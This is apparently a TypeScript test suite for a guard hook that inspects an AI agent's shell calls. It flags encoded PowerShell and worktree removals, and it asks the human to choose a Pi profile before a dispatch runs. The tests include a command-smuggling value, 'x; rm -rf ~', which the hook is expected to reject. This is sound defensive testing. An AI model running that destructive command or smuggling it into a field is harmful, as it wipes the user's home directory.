    expect(worktreeRemovals(`pwsh ${flag} ZQBjAGgAbwA=`).map(one => one.by), flag).toEqual(['opaque'])
    expect(worktreeRemovals(`powershell -NoProfile ${flag} ZQBjAGgAbwA=`).map(one => one.by), flag).toEqual(['opaque'])
  }
  expect(worktreeRemovals('pwsh -ExecutionPolicy Bypass -File x.ps1')).toEqual([])
  expect(worktreeRemovals('bash -e script.sh')).toEqual([])
})

test('PowerShell: the first positional argument is command text, and / is a flag prefix', () => {
  for (const form of ['powershell "orca worktree rm --worktree branch:x"', 'pwsh /Command "orca worktree rm --worktree branch:x"', 'powershell /enc ZQBjAGgAbwA=', 'pwsh -NoProfile -ExecutionPolicy Bypass "orca worktree rm --worktree branch:x"', 'powershell "orca worktree rm --worktree branch:x" -c', 'powershell -s "orca worktree rm --worktree branch:x"']) {
    expect(worktreeRemovals(form).map(one => one.by), form).toEqual(['opaque'])
  }
  for (const form of ['powershell -File build.ps1', 'powershell -ExecutionPolicy Bypass -File build.ps1', 'powershell build.ps1', 'powershell "echo hi"']) {
    expect(worktreeRemovals(form), form).toEqual([])
  }
})

test('path and name selectors must resolve to exactly one worktree', async () => {
  const porcelain = PORCELAIN + '\nworktree C:/r/other/issue-5\nHEAD ddd\nbranch refs/heads/other/5\n'
  const two = fakeGit('', { porcelain })
  expect(await checkRemovals('git worktree remove issue-5', two.git)).toContain('más de un worktree')
  expect(await checkRemovals('orca worktree rm --worktree name:issue-5', two.git)).toContain('más de un worktree')
  // an exact path still resolves to one
  expect(await checkRemovals('git worktree remove C:/r/ws/issue-5', fakeGit('', { porcelain }).git)).toBeUndefined()
  // a single suffix match is fine
  expect(await checkRemovals('git worktree remove ../ws/issue-6', fakeGit('').git)).toBeUndefined()
})

// ---- which gentle-pi profile does a pi dispatch get? ------------------------------------------------

const bridge = (model: string) => ({ model: `claude-bridge/${model}` })
// The issue 276 Rule 6 example: two launchable profiles and one with commandcode subagents.
const STORE = {
  kind: 'gentle-pi.agent_model_profiles',
  version: 1,
  active: 'OpusFull',
  profiles: {
    'opus-sonnet': { orchestrator: bridge('claude-opus-5-5'), 'gentle-ai-worker': bridge('claude-sonnet-5-5') },
    OpusFull: { orchestrator: bridge('claude-opus-5-5'), 'gentle-ai-worker': { model: 'anthropic/claude-opus-5-5' } },
    'samu-balanceado': { orchestrator: bridge('claude-opus-5-5'), 'gentle-ai-explore': { model: 'commandcode/deepseek/deepseek-v4.1-flash' } },
  },
}
const NO_PROFILE = 'guardia-despacho: no hay perfil de Pi elegido; preguntale al humano y repetí con --perfil-pi <nombre>.'
const rewritten = (command: string, name = 'opus-sonnet'): string => withProfile(command, piDispatchSlots(command), name)

test('the flag goes right after the agent of an orca-stack despachar/revisar to pi, whatever surrounds it', () => {
  expect(rewritten('orca-stack despachar 12 pi')).toBe('orca-stack despachar 12 pi --perfil-pi opus-sonnet')
  expect(rewritten('npx github:Gagaismo/orca-stack#v0.4.0 revisar 7 pi --nota "x"')).toBe(
    'npx github:Gagaismo/orca-stack#v0.4.0 revisar 7 pi --perfil-pi opus-sonnet --nota "x"',
  )
  expect(rewritten('cd repo && orca-stack despachar 12 pi | tail -5')).toBe('cd repo && orca-stack despachar 12 pi --perfil-pi opus-sonnet | tail -5')
  expect(rewritten('FOO=1 orca-stack.cmd despachar 3 PI; echo hecho')).toBe('FOO=1 orca-stack.cmd despachar 3 PI --perfil-pi opus-sonnet; echo hecho')
  expect(rewritten("& 'C:\\x\\orca-stack.ps1' despachar 3 'pi'")).toBe("& 'C:\\x\\orca-stack.ps1' despachar 3 'pi' --perfil-pi opus-sonnet")
  expect(rewritten('orca-stack despachar 1 pi && orca-stack revisar 2 pi')).toBe(
    'orca-stack despachar 1 pi --perfil-pi opus-sonnet && orca-stack revisar 2 pi --perfil-pi opus-sonnet',
  )
})

test('other agents, other commands, a flag already there, --dry-run and mere mentions are left alone', () => {
  for (const line of [
    'orca-stack despachar 12 claude',
    'orca-stack despachar 12 pi-extra',
    'orca-stack despachar pi 12',
    'orca-stack doctor',
    'orca-stack despachar 12 pi --perfil-pi OpusFull',
    'orca-stack despachar 12 pi --perfil-pi=OpusFull',
    'orca-stack revisar 12 pi --dry-run',
    'echo "orca-stack despachar 12 pi"',
    'grep -rn "despachar 12 pi" docs/ | orca-stack-notes',
    'scripts/despachar.sh 12 pi',
  ]) {
    expect(piDispatchSlots(line), line).toEqual([])
  }
})

test('issue 276 Rules 6 and 9: the profiles come from the store in its order, launchable ones only, labelled by their orchestrator', () => {
  const profiles = launchableProfiles(STORE)
  expect(profiles).toEqual([
    { name: 'opus-sonnet', label: 'opus-sonnet: orquesta claude-bridge/claude-opus-5-5' },
    { name: 'OpusFull', label: 'OpusFull: orquesta claude-bridge/claude-opus-5-5' },
  ])
  // OpenAI models are allowed; an unsafe name, a profile with no orchestrator model or one named global (the CLI
  // refuses it as ambiguous) is not offered.
  const other = { profiles: { 'a b': { orchestrator: bridge('x') }, 'no-orchestrator': { 'gentle-ai-worker': bridge('x') }, gpt: { orchestrator: { model: 'openai/gpt-5.2' } }, global: { orchestrator: bridge('x') } } }
  expect(launchableProfiles(other).map(profile => profile.name)).toEqual(['gpt'])
  expect(launchableProfiles(undefined)).toEqual([])
  // A label picks its profile; so does the name of a launchable profile typed under "Other"; anything else picks nothing.
  expect(chosenProfile(profiles[0]?.label ?? '', profiles)).toBe('opus-sonnet')
  expect(chosenProfile('OpusFull', profiles)).toBe('OpusFull')
  expect(chosenProfile('samu-balanceado', profiles)).toBeUndefined()
  expect(chosenProfile('x; rm -rf ~', profiles)).toBeUndefined()
  expect(configuredProfile('opus-sonnet')).toBe(true)
  expect(configuredProfile('global')).toBe(true)
  for (const none of [undefined, '', '  ', 'preguntar', 'Preguntar', 3]) {
    expect(configuredProfile(none)).toBe(false)
  }
})

type Asked = { asked: { header: string; options: string[] }[]; seen: string[] }

// The world for the hook: a home with the profiles store (and config layers), the dialog answered by `answer`.
const piWorld = (
  on: Parameters<typeof mock.clock>[0],
  opts: { layers?: Record<string, unknown>; store?: unknown; answer: (options: string[]) => string | undefined },
): Asked => {
  const layers: Record<string, unknown> = { ...(opts.layers ?? {}) }
  if (opts.store !== false) {
    layers['/home/u/.pi/gentle-ai/profiles.json'] = opts.store ?? STORE
  }
  mock.clock(on, { now: BEFORE })
  files(on, layers)
  const world: Asked = { asked: [], seen: [] }
  on('tool.call', { tool: 'AskUserQuestion' }, (_$, e) => {
    const question = (e as unknown as { questions: { question: string; header: string; options: { label: string }[] }[] }).questions[0]
    const options = (question?.options ?? []).map(option => option.label)
    world.asked.push({ header: question?.header ?? '', options })
    const picked = opts.answer(options)
    if (picked === undefined) {
      return { deny: 'dismissed' }
    }

    return { result: { questions: [], answers: { [question?.question ?? '']: picked } } as never }
  })
  on('tool.call', { tool: 'Bash' }, (_$, e) => {
    world.seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })

  return world
}

test('issue 276 Rule 6: the hook asks "Perfil Pi" with the launchable profiles and runs the dispatch with the chosen one', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, { answer: options => options[0] })
  await $.tool.call({ tool: 'Bash', command: 'orca-stack despachar 12 pi | tail -3' })
  expect(world.asked).toHaveLength(1)
  expect(world.asked[0]?.header).toBe('Perfil Pi')
  expect(world.asked[0]?.options).toEqual(['opus-sonnet: orquesta claude-bridge/claude-opus-5-5', 'OpusFull: orquesta claude-bridge/claude-opus-5-5'])
  expect(world.seen).toEqual(['orca-stack despachar 12 pi --perfil-pi opus-sonnet | tail -3'])
})

test('the second option picks OpusFull', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, { answer: options => options[1] })
  await $.tool.call({ tool: 'Bash', command: 'npx github:Gagaismo/orca-stack revisar 4 pi' })
  expect(world.seen).toEqual(['npx github:Gagaismo/orca-stack revisar 4 pi --perfil-pi OpusFull'])
})

test('issue 276 Rule 6: at most four options, in store order', async ($, on) => {
  forgetConfig()
  const profiles = Object.fromEntries(['p1', 'p2', 'p3', 'p4', 'p5'].map(name => [name, { orchestrator: bridge('claude-opus-5-5') }]))
  const world = piWorld(on, { store: { profiles }, answer: options => options[3] })
  await $.tool.call({ tool: 'Bash', command: 'orca-stack despachar 12 pi' })
  expect(world.asked[0]?.options.map(option => option.split(':')[0])).toEqual(['p1', 'p2', 'p3', 'p4'])
  expect(world.seen).toEqual(['orca-stack despachar 12 pi --perfil-pi p4'])
})

test('no question when the flag is there, the agent is not pi, or the command only mentions it', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, { answer: options => options[0] })
  const commands = ['orca-stack despachar 12 pi --perfil-pi OpusFull', 'orca-stack despachar 12 claude', 'echo "orca-stack despachar 12 pi"']
  for (const command of commands) {
    await $.tool.call({ tool: 'Bash', command })
  }
  expect(world.asked).toHaveLength(0)
  expect(world.seen).toEqual(commands)
})

test('issue 276 Rule 5: a dismissed question (or -p) denies the call instead of running it unchanged', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, { answer: () => undefined })
  const out = await $.tool.call({ tool: 'Bash', command: 'orca-stack despachar 12 pi' })
  expect(out.deny).toBe(NO_PROFILE)
  expect(world.seen).toHaveLength(0)
  const ps = await $.tool.call({ tool: 'PowerShell', command: 'orca-stack despachar 12 pi' })
  expect(ps.deny).toBe(NO_PROFILE)
})

test('issue 276 Rule 5: an answer that names no launchable profile denies the call', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, { answer: () => 'samu-balanceado' })
  const out = await $.tool.call({ tool: 'Bash', command: 'orca-stack despachar 12 pi' })
  expect(out.deny).toBe(NO_PROFILE)
  expect(world.seen).toHaveLength(0)
})

test('issue 276 Rule 5: no profiles store denies the call without asking', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, { store: false, answer: options => options[0] })
  const out = await $.tool.call({ tool: 'Bash', command: 'orca-stack despachar 12 pi' })
  expect(out.deny).toBe(NO_PROFILE)
  expect(world.asked).toHaveLength(0)
  expect(world.seen).toHaveLength(0)
})

test('issue 276 Rule 5: fewer than two launchable profiles denies the call without asking', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, { store: { profiles: { 'opus-sonnet': STORE.profiles['opus-sonnet'], 'samu-balanceado': STORE.profiles['samu-balanceado'] } }, answer: options => options[0] })
  const out = await $.tool.call({ tool: 'Bash', command: 'orca-stack despachar 12 pi' })
  expect(out.deny).toBe(NO_PROFILE)
  expect(world.asked).toHaveLength(0)
  expect(world.seen).toHaveLength(0)
})

const configuredWorld = async ($: Parameters<Parameters<typeof test>[1]>[0], on: Parameters<typeof mock.clock>[0], perfil: string) => {
  forgetConfig()
  const world = piWorld(on, {
    layers: { '/work/repo/.orca-stack.json': { agentes: { pi: { perfil } } } },
    answer: options => options[1],
  })
  const out = await $.tool.call({ tool: 'Bash', command: 'orca-stack despachar 12 pi' })
  expect(out.deny).toBeUndefined()
  expect(world.asked).toHaveLength(0)
  expect(world.seen).toEqual(['orca-stack despachar 12 pi'])
}

test('issue 276 Rule 5: agentes.pi.perfil set to a name: nobody is asked, nothing is denied or rewritten', async ($, on) => {
  await configuredWorld($, on, 'opus-sonnet')
})

test('issue 276 Rule 5: agentes.pi.perfil set to "global": nobody is asked, nothing is denied or rewritten', async ($, on) => {
  await configuredWorld($, on, 'global')
})

test('agentes.pi.perfil "preguntar" still asks', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, {
    layers: { '/work/repo/.orca-stack.json': { agentes: { pi: { perfil: 'preguntar' } } } },
    answer: options => options[0],
  })
  await $.tool.call({ tool: 'Bash', command: 'orca-stack revisar 9 pi' })
  expect(world.asked).toHaveLength(1)
  expect(world.seen).toEqual(['orca-stack revisar 9 pi --perfil-pi opus-sonnet'])
})

test('the existing guard still wins: a blocked pi is denied before any question', async ($, on) => {
  forgetConfig()
  const world = piWorld(on, {
    layers: {
      '/work/repo/.orca-stack.json': {
        despacho: { script: 'orca-stack' },
        guardia: { bloquear: [{ agente: 'pi', hasta: '2026-10-29', motivo: 'pi no tiene cuota.' }] },
      },
    },
    answer: options => options[0],
  })
  const out = await $.tool.call({ tool: 'Bash', command: 'orca-stack despachar 12 pi' })
  expect(out.deny).toBe('pi no tiene cuota.')
  expect(world.asked).toHaveLength(0)
  expect(world.seen).toHaveLength(0)
})
